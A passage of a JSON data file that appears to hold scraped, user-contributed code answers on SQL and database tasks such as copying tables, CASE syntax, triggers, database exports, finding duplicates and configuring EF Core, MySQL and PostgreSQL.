    "description": "Multiple field= SELECT username, email, COUNT(*) FROM users GROUP BY username, email HAVING COUNT(*) > 1  Single field= SELECT _column, COUNT(*)  FROM _table GROUP BY _column HAVING COUNT(*) > 1\nCREATE TABLE new_table LIKE original_table; INSERT INTO new_table SELECT * FROM original_table;\nCREATE TABLE new_table LIKE original_table;\nALTER TABLE Table1 ADD SubCategory2 {Type of subcategory 1} {NULL|NOT NULL}  UPDATE Table1 SET SubCategory2 = SubCategory; \n",
    "reg_date": "2021-10-12T09:55:11.000Z"
  },
  {
    "id": 957,
    "keyword": null,
    "link": null,
    "title": " duplicate table with data",
    "description": "-- Copy a table (datas, columns and storage parameters) CREATE TABLE my_new_table AS SELECT * FROM my_source_table; -- Use NOLOGGING, and PARALLEL if allowed for faster copy CREATE TABLE my_new_table     PARALLEL 10 NOLOGGING AS SELECT /*+ parallel(10) */ * FROM my_source_table; -- To create an empty table: CREATE TABLE my_new_table AS SELECT * FROM my_source_table \tWHERE rownum = 0;\n",
    "reg_date": "2021-10-12T09:55:11.000Z"
  },
  {
    "id": 958,
    "keyword": null,
    "link": null,
    "title": " ef core 5.0 usesqlserver not found",
    "description": "Install-Package Microsoft.EntityFrameworkCore.SqlServer\n",
    "reg_date": "2021-10-12T09:55:11.000Z"
  },
  {
    "id": 959,
    "keyword": null,
    "link": null,
    "title": " ef core connection string sql server",
    "description": "{   \"ConnectionStrings\": {     \"BloggingDatabase\": \"Server=(localdb)\\\\mssqllocaldb;Database=EFGetStarted.ConsoleApp.NewDb;Trusted_Connection=True;\"   }, } \n{   \"Logging\": {     \"LogLevel\": {       \"Default\": \"Information\",       \"Microsoft\": \"Warning\",       \"Microsoft.Hosting.Lifetime\": \"Information\"     }   },   \"AllowedHosts\": \"*\",   \"ConnectionStrings\": {     \"RazorPagesMovieContext\": \"Server=(localdb)\\\\mssqllocaldb;Database=RazorPagesMovieContext-bc;Trusted_Connection=True;MultipleActiveResultSets=true\"   } } \n",
    "reg_date": "2021-10-12T09:55:12.000Z"
  },
  {
    "id": 960,
    "keyword": null,
    "link": null,
    "title": " ef core entity framework sqlite cli",
    "description": "dotnet tool install --global dotnet-ef dotnet add package Microsoft.EntityFrameworkCore.Design --version 3.1.* dotnet add package Microsoft.EntityFrameworkCore.Sqlite --version 3.1.* dotnet ef migrations add InitialCreate dotnet ef database update\n",
    "reg_date": "2021-10-12T09:55:12.000Z"
  },
  {
    "id": 961,
    "keyword": null,
    "link": null,
    "title": " eliminate zero from integer  mysql",
    "description": "  REPLACE('0349010330', '0', '');\n",
    "reg_date": "2021-10-12T09:55:12.000Z"
  },
  {
    "id": 962,
    "keyword": null,
    "link": null,
    "title": " eloquest how to select one specific column in database",
    "description": "//Eloquent: Get specific columns (not all the row). Pluck returns an array. Model::where('id', 1)->pluck('name', 'surname'); // If you only want to get the result value: Model::where('id', 1)->value('name');\n   $result = DB::Table('table_name')->select('column1','column2')->where('id',1)->get();  \nModel::where('id', 1)          ->pluck('name', 'surname')          ->all();\nModelName::where('a', 1)->get(['column1','column2']);\nModelName::find($id, ['name', 'surname']);\n",
    "reg_date": "2021-10-12T09:55:12.000Z"
  },
  {
    "id": 963,
    "keyword": null,
    "link": null,
    "title": " else if sql server",
    "description": "IF (Expression 1) BEGIN    Statement 1; END  ELSE IF (Expression 2) BEGIN    Statement 2; END .......... ELSE  BEGIN    Default Statement; END\nIF Boolean_expression BEGIN     -- Statement block executes when the Boolean expression is TRUE END ELSE BEGIN     -- Statement block executes when the Boolean expression is FALSE END\nSELECT CASE                          WHEN A + B > C AND B + C > A AND A + C > B THEN                 CASE                      WHEN A = B AND B = C THEN 'Equilateral'                     WHEN A = B OR B = C OR A = C THEN 'Isosceles'                     ELSE 'Scalene'                 END             ELSE 'Not A Triangle'         END FROM TRIANGLES; \nIF 1=1 \tSELECT 1 ELSE \tSELECT 0 -- returns 1  -- Definition IF Boolean_expression         { sql_statement | statement_block }    [ ELSE         { sql_statement | statement_block } ]\n",
    "reg_date": "2021-10-12T09:55:12.000Z"
  },
  {
    "id": 964,
    "keyword": null,
    "link": null,
    "title": " email datatype in sql",
    "description": "I've always used VARCHAR(320). Here's why. The standard dictates the following limitations:  64 characters for the \"local part\" (username). 1 character for the @ symbol. 255 characters for the domain name.\n",
    "reg_date": "2021-10-12T09:55:12.000Z"
  },
  {
    "id": 965,
    "keyword": null,
    "link": null,
    "title": " enable full text search mysql",
    "description": "ALTER TABLE table_name   ADD FULLTEXT(column_name1, column_name2,&hellip;)\nmysql> CREATE TABLE tutorial ( id INT UNSIGNED AUTO_INCREMENT NOT NULL PRIMARY KEY,  title VARCHAR(200),  description TEXT,  FULLTEXT(title,description) ) ENGINE=InnoDB; Query OK, 0 rows affected (2.40 sec)\nmysql>INSERT INTO tutorial (title,description) VALUES ('SQL Joins','An SQL JOIN clause combines rows from two or more tables. It creates a set of rows in a temporary table.'), ('SQL Equi Join','SQL EQUI JOIN performs a JOIN against equality or matching column(s) values of the associated tables. An equal sign (=) is used as comparison operator in the where clause to refer equality.'), ('SQL Left Join','The SQL LEFT JOIN, joins two tables and fetches rows based on a condition, which is matching in both the tables and the unmatched rows will also be available from the table before the JOIN clause.'), ('SQL Cross Join','The SQL CROSS JOIN produces a result set which is the number of rows in the first table multiplied by the number of rows in the second table, if no WHERE clause is used along with CROSS JOIN.'), ('SQL Full Outer Join','In SQL the FULL OUTER JOIN combines the results of both left and right outer joins and returns all (matched or unmatched) rows from the tables on both sides of the join clause.'), ('SQL Self Join','A self join is a join in which a table is joined with itself (which is also called Unary relationships), especially when the table has a FOREIGN KEY which references its own PRIMARY KEY.');\n",
    "reg_date": "2021-10-12T09:55:12.000Z"
  },
  {
    "id": 966,
    "keyword": null,
    "link": null,
    "title": " enable password in mysql root user in mysql 8",
    "description": "1. If you in skip-grant-tables mode in mysqld_safe:  mysql> UPDATE mysql.user SET authentication_string=null WHERE User='root'; mysql> FLUSH PRIVILEGES; mysql> exit;  and then, in terminal:  $ mysql -u root  in mysql: mysql> ALTER USER 'root'@'localhost' IDENTIFIED WITH caching_sha2_password BY 'yourpasswd';   2. Not in skip-grant-tables mode just in mysql: mysql> ALTER USER 'root'@'localhost' IDENTIFIED WITH caching_sha2_password BY 'yourpasswd';\n",
    "reg_date": "2021-10-12T09:55:12.000Z"
  },
  {
    "id": 967,
    "keyword": null,
    "link": null,
    "title": " end as sql",
    "description": "-- NOTE: this is for SQL-Oracle specifically  /* NB: Please like Mingles444 post, I derived this from him/her */  -- syntax: (Retrieved from grepper:Mingles444) CASE     WHEN condition1 THEN result1     WHEN condition2 THEN result2     WHEN conditionN THEN resultN     ELSE result END   -- example: SELECT  \tCASE       WHEN (1+6 = 6) THEN 'A'       WHEN (1+6 = 7) THEN 'B'       WHEN (1+6 = 8) THEN 'C'       ELSE 'D' \tEND  FROM DUAL;  -- OUTPUT: B \n/*CASE statements are used to create different outputs and is    used by SQL as a way to handle if-then logic.*/      SELECT column_name,     CASE        WHEN condition THEN 'Result_1'       WHEN condition THEN 'Result_2'       ELSE 'Result_3'     END   FROM table_name;\nselect  case when ID in ('1', '2', '3') then 'Jack' else 'Jim' end as Person from Table.Names  select case when ID in ('1', '2', '3') then 'Jack' else 'Jim' end Person from Table.Names\n",
    "reg_date": "2021-10-12T09:55:12.000Z"
  },
  {
    "id": 968,
    "keyword": null,
    "link": null,
    "title": " entities query in",
    "description": "int[] ids = { 1, 2, 3, 4, 5};  var query = from item in db.myTable             where ids.Contains(item.ID)             select item; \n",
    "reg_date": "2021-10-12T09:55:12.000Z"
  },
  {
    "id": 969,
    "keyword": null,
    "link": null,
    "title": " enum mysql",
    "description": " create table users(   id int unsigned auto_increment,   name varchar(30) not null,   email char(30),    telephone varchar(15),   password varchar(10),   user_type enum('manager','user'),   primary key(email)  );\n",
    "reg_date": "2021-10-12T09:55:13.000Z"
  },
  {
    "id": 970,
    "keyword": null,
    "link": null,
    "title": " epoch time converter in snowflake",
    "description": "select to_timestamp(column_name) from table_name;\n",
    "reg_date": "2021-10-12T09:55:13.000Z"
  },
  {
    "id": 971,
    "keyword": null,
    "link": null,
    "title": " error 1451 (23000): cannot delete or update a parent row: a foreign key constraint fails",
    "description": "SET FOREIGN_KEY_CHECKS = 0; -- to disable FK checks (ex: for delete purpose) SET FOREIGN_KEY_CHECKS = 1; -- to re-enable FK checks \n",
    "reg_date": "2021-10-12T09:55:13.000Z"
  },
  {
    "id": 972,
    "keyword": null,
    "link": null,
    "title": " error code 1055",
    "description": "SELECT name, ANY_VALUE(address), MAX(age) FROM t GROUP BY name;\n",
    "reg_date": "2021-10-12T09:55:13.000Z"
  },
  {
    "id": 973,
    "keyword": null,
    "link": null,
    "title": " error code 1205 mysql",
    "description": "SET innodb_lock_wait_timeout = 5000;\n",
    "reg_date": "2021-10-12T09:55:13.000Z"
  },
  {
    "id": 974,
    "keyword": null,
    "link": null,
    "title": " error code 1215 cannot add foreign key constraint",
    "description": "Try this if are data in one or more tables from foreign key references set foreign_key_checks=0;  Else it is a problem in forign key parameters (references parameters) \n",
    "reg_date": "2021-10-12T09:55:13.000Z"
  },
  {
    "id": 975,
    "keyword": null,
    "link": null,
    "title": " error cs1061 'dbcontextoptionsbuilder' does not contain a definition for 'usesqlserver'",
    "description": "Install-Package Microsoft.EntityFrameworkCore.SqlServer\n",
    "reg_date": "2021-10-12T09:55:13.000Z"
  },
  {
    "id": 976,
    "keyword": null,
    "link": null,
    "title": " escape qouble quotes SQL",
    "description": "DECLARE @my_table TABLE (     [value] VARCHAR(200) )  INSERT INTO @my_table VALUES ('hi, my name''s tim.')  SELECT * FROM @my_table\n\"I asked my son's teacher, \\\"How is my son doing now?\\\"\" \n",
    "reg_date": "2021-10-12T09:55:13.000Z"
  },
  {
    "id": 977,
    "keyword": null,
    "link": null,
    "title": " events mysql",
    "description": "SELECT * FROM INFORMATION_SCHEMA.events;\n",
    "reg_date": "2021-10-12T09:55:13.000Z"
  },
  {
    "id": 978,
    "keyword": null,
    "link": null,
    "title": " example of trigger in postgresql",
    "description": " -- Trigger to update donatiom count in donor table whenever -- A new donation is made by that person  CREATE or REPLACE FUNCTION increase_count() RETURNS TRIGGER AS $$ BEGIN \tUPDATE donor SET dcount = dcount + 1 WHERE did = NEW.did; END $$ LANGUAGE plpgsql;    CREATE TRIGGER update_donation_count AFTER INSERT ON donation FOR EACH ROW EXECUTE PROCEDURE increase_count(); \n",
    "reg_date": "2021-10-12T09:55:13.000Z"
  },
  {
    "id": 979,
    "keyword": null,
    "link": null,
    "title": " excel export from sql using python",
    "description": "import pandas as pd import xlsxwriter import pyodbc   conn = pyodbc.connect('Driver={SQL Server}; Server=ServerIP; uid=UID; pwd=Password; Trusted_Connection=No;')  with pd.ExcelWriter(\"Output.xlsx\", engine=\"xlsxwriter\", options = {'strings_to_numbers': True, 'strings_to_formulas': False}) as writer:         try:             df = pd.read_sql(\"Select * from Orders\", conn)             df.to_excel(writer, sheet_name = \"Sheet1\", header = True, index = False)             print(\"File saved successfully!\")         except:             print(\"There is an error\") \n",
    "reg_date": "2021-10-12T09:55:14.000Z"
  },
  {
    "id": 980,
    "keyword": null,
    "link": null,
    "title": " exception in plsql",
    "description": "DECLARE     c_id customers.id%type := 8;     c_name customerS.Name%type;     c_addr customers.address%type;  BEGIN     SELECT  name, address INTO  c_name, c_addr     FROM customers     WHERE id = c_id;      DBMS_OUTPUT.PUT_LINE ('Name: '||  c_name);     DBMS_OUTPUT.PUT_LINE ('Address: ' || c_addr);   EXCEPTION     WHEN no_data_found THEN        dbms_output.put_line('No such customer!');     WHEN others THEN        dbms_output.put_line('Error!');  END;  \n",
    "reg_date": "2021-10-12T09:55:14.000Z"
  },
  {
    "id": 981,
    "keyword": null,
    "link": null,
    "title": " exclude rows sql server",
    "description": "SELECT Name, BirthDate FROM Employee EXCEPT SELECT Name, BirthDate FROM Customer\n",
    "reg_date": "2021-10-12T09:55:14.000Z"
  },
  {
    "id": 982,
    "keyword": null,
    "link": null,
    "title": " execut sql python",
    "description": "# connect database and create cursor here import sqlite3  conn = sqlite3.connect('File.Name') cur = conn.cursor() # statement to be executed cur.execute(\"\"\"SELECT COL_NAME FROM TABLE_NAME LIMIT 5;\"\"\").fetchall() \n",
    "reg_date": "2021-10-12T09:55:14.000Z"
  },
  {
    "id": 983,
    "keyword": null,
    "link": null,
    "title": " execute mysql file",
    "description": "mysql -u yourusername -p yourpassword yourdatabase < text_file\n mysql> use db_name;  mysql> source file_name.sql;\n",
    "reg_date": "2021-10-12T09:55:14.000Z"
  },
  {
    "id": 984,
    "keyword": null,
    "link": null,
    "title": " execute sp in sql server",
    "description": "proc_name paramValue1, paramValue2 \n    exec procName      @parameter_1_Name = 'parameter_1_Value',      @parameter_2_name = 'parameter_2_value',     @parameter_z_name = 'parameter_z_value' \nEXEC proc_name 'paramValue1','paramValue2' \n",
    "reg_date": "2021-10-12T09:55:14.000Z"
  },
  {
    "id": 985,
    "keyword": null,
    "link": null,
    "title": " execute sql script",
    "description": "sqlplus username/password@service\t-- OR sqlplus / as sysdba  SQL> SELECT sysdate FROM dual;  SQL> @C:\\Users\\folder\\script.sql -- OR  SQL> START C:\\Users\\folder\\script.sql\nmysql -u yourUserName -p yourDatabaseName < yourFileName.sql\n",
    "reg_date": "2021-10-12T09:55:14.000Z"
  },
  {
    "id": 986,
    "keyword": null,
    "link": null,
    "title": " execute sql stored procedure in powershell",
    "description": "$rrex = Invoke-Sqlcmd -ServerInstance \"OurServer\" -Database \"OurDatabase\" -Query \"EXEC stpGetData\"  foreach ($rrec in $rrex) {     if ($rrec.IdVar -notmatch \"V-[1-8]{1}\")     {         $rrec.Id     } }\n",
    "reg_date": "2021-10-12T09:55:14.000Z"
  },
  {
    "id": 987,
    "keyword": null,
    "link": null,
    "title": " execute table valued function in sql",
    "description": "SELECT      *  FROM      udfProductInYear(2017); \n",
    "reg_date": "2021-10-12T09:55:14.000Z"
  },
  {
    "id": 988,
    "keyword": null,
    "link": null,
    "title": " execution order in sql",
    "description": "SQL order of execution defines the execution order of clauses.  -Select It starts execution with  -from  (Choose and join tables to get base data) after from -where ( filters base data ) -group by (Aggregates base data) -having (filters aggregated data) -select (returns final data) -order by (sorts the final data) -limit (limits the returned data to a row count)  Only select and from are mandatory\nSELECT DISTINCT column, AGG_FUNC(column_or_expression), &hellip; FROM mytable     JOIN another_table       ON mytable.column = another_table.column     WHERE constraint_expression     GROUP BY column     HAVING constraint_expression     ORDER BY column ASC/DESC     LIMIT count OFFSET COUNT;\n",
    "reg_date": "2021-10-12T09:55:15.000Z"
  },
  {
    "id": 989,
    "keyword": null,
    "link": null,
    "title": " exit mysql command",
    "description": "exit \nTo exit from mysql type quit at the mysql> command-prompt\nexit();\n",
    "reg_date": "2021-10-12T09:55:15.000Z"
  },
  {
    "id": 990,
    "keyword": null,
    "link": null,
    "title": " export all databases mysql",
    "description": " # Export  mysqldump -u root -p --all-databases > all.sql\n",
    "reg_date": "2021-10-12T09:55:15.000Z"
  },
  {
    "id": 991,
    "keyword": null,
    "link": null,
    "title": " export postgres database linux",
    "description": "pg_dump -U username dbname > dbexport.pgsql \n",
    "reg_date": "2021-10-12T09:55:15.000Z"
  },
  {
    "id": 992,
    "keyword": null,
    "link": null,
    "title": " export product data from woocommerce mysql",
    "description": "-- If you need to export products from WooCommerce using MySQL then -- try out the code below:  SELECT    p.ID,   p.post_title,   `post_content`,   `post_excerpt`,   t.name AS product_category,   t.term_id AS product_id,   t.slug AS product_slug,   tt.term_taxonomy_id AS tt_term_taxonomia,   tr.term_taxonomy_id AS tr_term_taxonomia,   MAX(CASE WHEN pm1.meta_key = '_stock' then pm1.meta_value ELSE NULL END) as stock,   MAX(CASE WHEN pm1.meta_key = '_price' then pm1.meta_value ELSE NULL END) as price,   MAX(CASE WHEN pm1.meta_key = '_regular_price' then pm1.meta_value ELSE NULL END) as regular_price,   MAX(CASE WHEN pm1.meta_key = '_sale_price' then pm1.meta_value ELSE NULL END) as sale_price,   MAX(CASE WHEN pm1.meta_key = '_sku' then pm1.meta_value ELSE NULL END) as sku  FROM wp_posts p  LEFT JOIN wp_postmeta pm1 ON pm1.post_id = p.ID LEFT JOIN wp_term_relationships AS tr ON tr.object_id = p.ID JOIN wp_term_taxonomy AS tt ON tt.taxonomy = 'product_cat' AND tt.term_taxonomy_id = tr.term_taxonomy_id  JOIN wp_terms AS t ON t.term_id = tt.term_id WHERE p.post_type in('product', 'product_variation') AND p.post_status = 'publish' AND p.post_content <> '' GROUP BY p.ID,p.post_title   ORDER BY `p`.`ID` ASC  -- Now you can export the results to a .csv file :) -- Happy coding, my homies <3\n",
    "reg_date": "2021-10-12T09:55:15.000Z"
  },
  {
    "id": 993,
    "keyword": null,
    "link": null,
    "title": " extract month from date in mysql",
    "description": "SELECT MONTH(field_name) as month FROM yourtable \nSELECT DATE_FORMAT(test_date,'%Y%m') AS date FROM test_table;\nSELECT EXTRACT(MONTH FROM '2020-07-05')\nSELECT MONTHNAME(column_date,&rsquo;%m&rsquo;)) as monthname from tablename;\nMONTH(date) \n",
    "reg_date": "2021-10-12T09:55:15.000Z"
  },
  {
    "id": 994,
    "keyword": null,
    "link": null,
    "title": " extract weekday from date in sql",
    "description": "SELECT WEEKDAY(date);\n",
    "reg_date": "2021-10-12T09:55:15.000Z"
  },
  {
    "id": 995,
    "keyword": null,
    "link": null,
    "title": " extract year from date sql",
    "description": "SELECT extract(YEAR FROM sysdate) FROM dual;\t\t\t// number SELECT to_char(sysdate, 'YYYY') FROM dual;\t\t\t\t// varchar\nSELECT EXTRACT(YEAR FROM CURRENT_DATE)\n",
    "reg_date": "2021-10-12T09:55:15.000Z"
  },
  {
    "id": 996,
    "keyword": null,
    "link": null,
    "title": " failed to start mysql.service unit mysql.service not found. fedora",
    "description": "#check status after then run this cmnd systemctl status mysqld.service  &times; mysqld.service - MySQL Server      Loaded: loaded (/usr/lib/systemd/system/mysqld.service; enabled; vendor preset: disabled)      Active: failed (Result: exit-code) since Sat 2021-09-04 09:33:31 IST; 1h 58min ago        Docs: man:mysqld(8)              http://dev.mysql.com/doc/refman/en/using-systemd.html    Main PID: 1056 (code=exited, status=1/FAILURE)      Status: \"Server startup in progress\"         CPU: 2.465s  Sep 04 09:33:26 fedora systemd[1]: Starting MySQL Server... Sep 04 09:33:31 fedora systemd[1]: mysqld.service: Main process exited, code=exited, status=1/FAILURE Sep 04 09:33:31 fedora systemd[1]: mysqld.service: Failed with result 'exit-code'. Sep 04 09:33:31 fedora systemd[1]: Failed to start MySQL Server. Sep 04 09:33:31 fedora systemd[1]: mysqld.service: Consumed 2.465s CPU time.  ---------------------------- sudo systemctl enable mysqld sudo systemctl start mysqld \n",
    "reg_date": "2021-10-12T09:55:15.000Z"
  },
  {
    "id": 997,
    "keyword": null,
    "link": null,
    "title": " fatal error: libpq-fe.h: No such file or directory",
    "description": "sudo apt-get install libpq-dev \n",
    "reg_date": "2021-10-12T09:55:15.000Z"
  },
  {
    "id": 998,
    "keyword": null,
    "link": null,
    "title": " fetch first 10 rows in oracle sql developer",
    "description": "SELECT * FROM (SELECT [COLUMNS] FROM [TABLE] ORDER BY [DATE] DESC)     WHERE ROWNUM >= 1 AND ROWNUM <=10; -- Oracle 12c: SELECT * FROM (SELECT [COLUMNS] FROM [TABLE] ORDER BY [DATE] DESC)      FETCH FIRST 10 ROWS ONLY;\n",
    "reg_date": "2021-10-12T09:55:16.000Z"
  },
  {
    "id": 999,
    "keyword": null,
    "link": null,
    "title": " fetch first 5 rows in oracle sql developer",
    "description": "-- Oracle <= 11g  SELECT * FROM ( SELECT * FROM emp ORDER BY sal DESC ) WHERE ROWNUM <= 5; \t -- Oracle 12c + SELECT * FROM emp ORDER BY sal DESC FETCH FIRST 5 ROWS ONLY;\t\n",
    "reg_date": "2021-10-12T09:55:16.000Z"
  },
  {
    "id": 1000,
    "keyword": null,
    "link": null,
    "title": " fetchone python sqlite",
    "description": "import sqlite3  try:     sqliteConnection = sqlite3.connect('SQLite_Python.db')     cursor = sqliteConnection.cursor()     print(\"Database created and Successfully Connected to SQLite\")      sqlite_select_Query = \"select sqlite_version();\"     cursor.execute(sqlite_select_Query)     record = cursor.fetchall()     print(\"SQLite Database Version is: \", record)     cursor.close()  except sqlite3.Error as error:     print(\"Error while connecting to sqlite\", error) finally:     if (sqliteConnection):         sqliteConnection.close()         print(\"The SQLite connection is closed\")\n#Fetches the next row of a query result set, returning a single sequence, or None when no more data is available. import sqlite3  con = sqlite3.connect(\":memory:\") cur = con.cursor() cur.executescript(\"\"\"     create table samples(         id,         value     );     insert into samples(id, value)     values (         '123',         'abcdef'     );     \"\"\") cur.execute(\"SELECT * from samples\") print cur.fetchone() OUTPUT (u'123', u'abcdef')\n",
    "reg_date": "2021-10-12T09:55:16.000Z"
  },
  {
    "id": 1001,
    "keyword": null,
    "link": null,
    "title": " file /etc/init.d/mysql not exists",
    "description": "-- this saved my ass service mysqld restart\n",
    "reg_date": "2021-10-12T09:55:16.000Z"
  },
  {
    "id": 1002,
    "keyword": null,
    "link": null,
    "title": " filter",
    "description": "select * from   toys where  toy_name ='Sir Stripypants' OR colour ='blue' \t   AND price = 6;\nfunction isBigEnough(value) {   return value >= 10 }  let filtered = [12, 5, 8, 130, 44].filter(isBigEnough) // filtered is [12, 130, 44] \ndf_filtered = df[(df.Price > 500000) & (df.Rooms > 3)]df_filtered.head()\nselect toy_name from   toys where  toy_name like '%B%;\nconst array = [-3, -2, -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13];   function isPrime(num) {   for (let i = 2; num > i; i++) {     if (num % i == 0) {       return false;     }   }   return num > 1; }  console.log(array.filter(isPrime)); // [2, 3, 5, 7, 11, 13]\nselect * from   toys where  colour in ('red','blue') \t   AND price >= 6 AND price < 14.22;\nselect toy_name from   toys where colour <> 'GREEN' AND price <> 6\n",
    "reg_date": "2021-10-12T09:55:16.000Z"
  },
  {
    "id": 1003,
    "keyword": null,
    "link": null,
    "title": " find a column in all tables mysql",
    "description": "SELECT DISTINCT TABLE_NAME      FROM INFORMATION_SCHEMA.COLUMNS     WHERE COLUMN_NAME IN ('columnA','ColumnB')         AND TABLE_SCHEMA='YourDatabase';\nSELECT DISTINCT TABLE_NAME      FROM INFORMATION_SCHEMA.COLUMNS     WHERE COLUMN_NAME IN ('columnA','ColumnB')         AND TABLE_SCHEMA='YourDatabase'; \n",
    "reg_date": "2021-10-12T09:55:16.000Z"
  },
  {
    "id": 1004,
    "keyword": null,
    "link": null,
    "title": " find a column in all tables postgres",
    "description": "select t.table_schema,        t.table_name from information_schema.tables t inner join information_schema.columns c on c.table_name = t.table_name                                  and c.table_schema = t.table_schema where c.column_name = 'last_name'       and t.table_schema not in ('information_schema', 'pg_catalog')       and t.table_type = 'BASE TABLE' order by t.table_schema; Code has been copied\n",
    "reg_date": "2021-10-12T09:55:16.000Z"
  },
  {
    "id": 1005,
    "keyword": null,
    "link": null,
    "title": " find all foreign keys referencing a table in sql server",
    "description": "SELECT     OBJECT_NAME(f.parent_object_id) TableName,    COL_NAME(fc.parent_object_id,fc.parent_column_id) ColName FROM     sys.foreign_keys AS f INNER JOIN     sys.foreign_key_columns AS fc        ON f.OBJECT_ID = fc.constraint_object_id INNER JOIN     sys.tables t        ON t.OBJECT_ID = fc.referenced_object_id WHERE     OBJECT_NAME (f.referenced_object_id) = 'YourTableName'\n--find all foreign keys referencing a table in sql server SELECT     OBJECT_NAME(f.parent_object_id) TableName,    COL_NAME(fc.parent_object_id,fc.parent_column_id) ColName FROM     sys.foreign_keys AS f INNER JOIN     sys.foreign_key_columns AS fc        ON f.OBJECT_ID = fc.constraint_object_id INNER JOIN     sys.tables t        ON t.OBJECT_ID = fc.referenced_object_id WHERE     OBJECT_NAME (f.referenced_object_id) = 'YourTableName'\n",
    "reg_date": "2021-10-12T09:55:16.000Z"
  },
  {
    "id": 1006,
    "keyword": null,
    "link": null,
    "title": " find and replace database table phpmyadmin",
    "description": "update TABLE_NAME set FIELD_NAME = replace(FIELD_NAME, 'Text to find', 'text to replace with');\n",
    "reg_date": "2021-10-12T09:55:16.000Z"
  },
  {
    "id": 1007,
    "keyword": null,
    "link": null,
    "title": " find and replace query in wordpress\\",
    "description": "UPDATE wp_options SET option_value = replace(option_value, 'http://www.oldurl', 'http://www.newurl') WHERE option_name = 'home' OR option_name = 'siteurl';  UPDATE wp_posts SET guid = replace(guid, 'http://www.oldurl','http://www.newurl');  UPDATE wp_posts SET post_content = replace(post_content, 'http://www.oldurl', 'http://www.newurl');  UPDATE wp_postmeta SET meta_value = replace(meta_value,'http://www.oldurl','http://www.newurl');\n",
    "reg_date": "2021-10-12T09:55:16.000Z"
  },
  {
    "id": 1008,
    "keyword": null,
    "link": null,
    "title": " find column in all stored procedures sql server",
    "description": "-- Search column in All Objects SELECT OBJECT_NAME(OBJECT_ID), definition FROM sys.sql_modules WHERE definition LIKE '%' + 'BusinessEntityID' + '%' GO \n",
    "reg_date": "2021-10-12T09:55:16.000Z"
  },
  {
    "id": 1009,
    "keyword": null,
    "link": null,
    "title": " find column name in database",
    "description": "SELECT      COLUMN_NAME AS 'ColumnName'             ,TABLE_NAME AS  'TableName' FROM        INFORMATION_SCHEMA.COLUMNS WHERE       COLUMN_NAME LIKE '%MyName%' ORDER BY    TableName             ,ColumnName;\nSELECT      c.name  AS 'ColumnName'             ,t.name AS 'TableName' FROM        sys.columns c JOIN        sys.tables  t   ON c.object_id = t.object_id WHERE       c.name LIKE '%MyName%' ORDER BY    TableName             ,ColumnName;\nSELECT      c.name  AS 'ColumnName'             ,t.name AS 'TableName' FROM        sys.columns c JOIN        sys.tables  t   ON c.object_id = t.object_id WHERE       c.name LIKE '%columnName%' ORDER BY    TableName             ,ColumnName;\nGet table containing given field\n",
    "reg_date": "2021-10-12T09:55:17.000Z"
  },
  {
    "id": 1010,
    "keyword": null,
    "link": null,
    "title": " find difference in dates sql",
    "description": "SELECT DATEDIFF(day, date1,date2) AS DateDiff /* DATEDIFF accepts three arguments 1- day, month, year etc what form you need difference 2,3- dates  */\nSELECT (END_DATE - START_DATE) Days-Total FROM MyTable /*this works for oracle sql*/\n",
    "reg_date": "2021-10-12T09:55:17.000Z"
  },
  {
    "id": 1011,
    "keyword": null,
    "link": null,
    "title": " find duplicate keys in mysql",
    "description": "SELECT name, COUNT(*) c FROM table GROUP BY name HAVING c > 1;\nSELECT col, COUNT(col) FROM table_name GROUP BY col HAVING COUNT(col) > 1;\nSELECT      col1, COUNT(col1),     col2, COUNT(col2) FROM     table_name GROUP BY      col1,      col2 HAVING         (COUNT(col1) > 1) AND         (COUNT(col2) > 1); \n",
    "reg_date": "2021-10-12T09:55:17.000Z"
  },
  {
    "id": 1012,
    "keyword": null,
    "link": null,
    "title": " find duplicates mysql",
    "description": "SELECT name, COUNT(*) c FROM table GROUP BY name HAVING c > 1;\nSELECT      col1, COUNT(col1),     col2, COUNT(col2) FROM     table_name GROUP BY      col1,      col2 HAVING         (COUNT(col1) > 1) AND         (COUNT(col2) > 1); \nSELECT      col,      COUNT(col) FROM     table_name GROUP BY col HAVING COUNT(col) > 1;\n",
    "reg_date": "2021-10-12T09:55:17.000Z"
  },
  {
    "id": 1013,
    "keyword": null,
    "link": null,
    "title": " find duplicates mysql column",
    "description": "SELECT name, COUNT(*) c FROM table GROUP BY name HAVING c > 1;\nSELECT col, COUNT(col) FROM table_name GROUP BY col HAVING COUNT(col) > 1;\n",
    "reg_date": "2021-10-12T09:55:17.000Z"
  },
  {
    "id": 1014,
    "keyword": null,
    "link": null,
    "title": " find how many table doesn't contain column in mysql",
    "description": "select t.* from INFORMATION_SCHEMA.TABLES as t     left join INFORMATION_SCHEMA.COLUMNS as c     on c.TABLE_NAME = t.TABLE_NAME     and c.TABLE_SCHEMA = t.TABLE_SCHEMA     and c.COLUMN_NAME = 'unique' where c.COLUMN_NAME is null and t.TABLE_SCHEMA = 'database'\n",
    "reg_date": "2021-10-12T09:55:17.000Z"
  },
  {
    "id": 1015,
    "keyword": null,
    "link": null,
    "title": " find largest table in mysql database",
    "description": "SELECT table_schema as \"Database\", table_name AS \"Table\",  ROUND(((data_length + index_length) / 1024 / 1024), 2) AS \"Size (MB)\"  FROM information_schema.TABLES  WHERE (data_length + index_length) > 1000000  ORDER BY table_schema, (data_length + index_length) DESC\n",
    "reg_date": "2021-10-12T09:55:17.000Z"
  },
  {
    "id": 1016,
    "keyword": null,
    "link": null,
    "title": " find last instance of character in string mysql",
    "description": "SELECT SUBSTRING_INDEX(\"first_middle_last\", '_', -1);\n",
    "reg_date": "2021-10-12T09:55:17.000Z"
  },
  {
    "id": 1017,
    "keyword": null,
    "link": null,
    "title": " find logged in users mysql",
    "description": "SELECT SUBSTRING_INDEX(host, ':', 1) AS host_short,        GROUP_CONCAT(DISTINCT user) AS users,        COUNT(*) AS threads FROM information_schema.processlist GROUP BY host_short ORDER BY COUNT(*), host_short;\n",
    "reg_date": "2021-10-12T09:55:17.000Z"
  },
  {
    "id": 1018,
    "keyword": null,
    "link": null,
    "title": " find lowest number in sql",
    "description": "SELECT first_name, last_name, salary, job_id FROM employees WHERE salary = (SELECT MIN(salary) FROM employees); \n",
    "reg_date": "2021-10-12T09:55:18.000Z"
  },
  {
    "id": 1019,
    "keyword": null,
    "link": null,
    "title": " find mysql version linux",
